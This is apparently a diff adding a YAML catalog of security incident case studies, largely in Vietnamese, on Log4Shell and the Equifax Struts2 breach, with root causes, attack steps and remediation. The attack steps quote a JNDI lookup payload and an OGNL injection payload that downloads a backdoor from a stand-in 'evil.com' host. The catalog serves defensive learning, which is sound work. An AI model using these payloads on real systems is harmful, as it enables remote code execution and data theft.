@@ -1,0 +1,53 @@
+catalog_id: ASRP-CS-INJ-001
+name: Injection & Remote Code Execution (RCE) Incident Case Studies
+version: 2.0.0
+applicable_stack: [java, spring, python, nodejs, express, log4j, struts]
+
+case_studies:
+  - case_id: CS-INJ-001
+    title: Log4Shell Unauthenticated JNDI Injection Remote Code Execution
+    cve_id: CVE-2021-44228
+    incident_year: 2021
+    target_vulnerability: CWE-502 (Deserialization of Untrusted Data / JNDI Lookup)
+    capec_ref: CAPEC-586
+    impact_summary: >
+      Ảnh hưởng hàng trăm triệu thiết bị và dịch vụ cloud toàn cầu. Attacker có thể thực thi mã từ xa (RCE)
+      với quyền root/system chỉ bằng cách gửi chuỗi User-Agent hoặc payload log đơn giản.
+    root_cause_analysis: |
+      Thư viện Apache Log4j2 phiên bản 2.0-beta9 đến 2.14.1 bật mặc định tính năng JNDI Lookup (`${jndi:ldap://...}`).
+      Khi log một chuỗi input do người dùng gửi lên chứa `${jndi:ldap://evil.com/a}`, Log4j tự động tạo kết nối LDAP
+      tới server ngoài, tải về class Java độc hại và deserialize thực thi trong JVM bộ nhớ.
+    attack_vector_sequence:
+      - "Bước 1: Attacker gửi HTTP Request chứa payload `${jndi:ldap://attacker.com/exploit}` trong Header `User-Agent` hoặc `X-Api-Version`."
+      - "Bước 2: Application Server sử dụng `logger.info()` để ghi vết HTTP Request Header vào log file."
+      - "Bước 3: Log4j parser phát hiện cú pháp JNDI lookup, thực hiện truy vấn DNS/LDAP tới IP của Attacker."
+      - "Bước 4: Attacker LDAP server trả về tham số `javaFactory`, kích hoạt JVM tự động download và thực thi mã độc Java bytecode."
+    lessons_learned_remediation: |
+      1. Nâng cấp Log4j lên phiên bản 2.17.1+ (tắt mặc định JNDI lookup và loại bỏ support message lookups).
+      2. Cấu hình biến môi trường JVM `-Dlog4j2.formatMsgNoLookups=true` làm bản vá khẩn cấp tạm thời.
+      3. Cấu hình Egress Firewall/NetworkPolicy chặn kết nối Outbound LDAP (port 389, 636, 1099) từ Application Pods ra Internet.
+    applicable_stack: [java, spring, log4j]
+
+  - case_id: CS-INJ-002
+    title: Equifax Data Breach via Apache Struts2 OGNL Injection
+    cve_id: CVE-2017-5638
+    incident_year: 2017
+    target_vulnerability: CWE-94 (Improper Control of Generation of Code - OGNL Injection)
+    capec_ref: CAPEC-88
+    impact_summary: >
+      Rò rỉ dữ liệu cá nhân và tài chính nhạy cảm của 147 triệu người dùng Mỹ.
+      Tổng thiệt hại tài chính và tiền phạt pháp lý vượt quá 1.4 tỷ USD.
+    root_cause_analysis: |
+      Jakarta Multipart parser trong Apache Struts2 xử lý sai thông báo lỗi khi upload file.
+      Nếu Content-Type header bị lỗi, parser chèn trực tiếp chuỗi header vào thông báo lỗi và gửi tới OGNL (Object-Graph Navigation Language)
+      expression evaluator mà không làm sạch, cho phép Attacker thực thi lệnh hệ thống HĐH qua OGNL expressions.
+    attack_vector_sequence:
+      - "Bước 1: Attacker gửi HTTP POST request tới server với Content-Type chứa OGNL payload: `%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('wget http://evil.com/backdoor'))}`."
+      - "Bước 2: Struts2 Jakarta Multipart parser gặp lỗi parse header, gọi hàm sinh message lỗi."
+      - "Bước 3: OGNL Evaluator biên dịch và thực thi đoạn Java reflection code trong payload, tải backdoor về máy chủ."
+      - "Bước 4: Attacker chiếm shell root, tìm kiếm credentials lưu trong cấu hình và trích xuất cơ sở dữ liệu tín dụng."
+    lessons_learned_remediation: |
+      1. Thiết lập quy trình tự động cập nhật phần mềm (SCA) để vá lỗ hổng phụ thuộc trong vòng 24-48h sau khi công bố CVE.
+      2. Áp dụng WAF Rule chặn các kí tự đặc biệt OGNL/Expression Language trong HTTP Headers.
+      3. Phân quyền tối thiểu (Least Privilege) cho tài khoản chạy Web Application Service (chạy unprivileged user).
+    applicable_stack: [java, struts, tomcat]
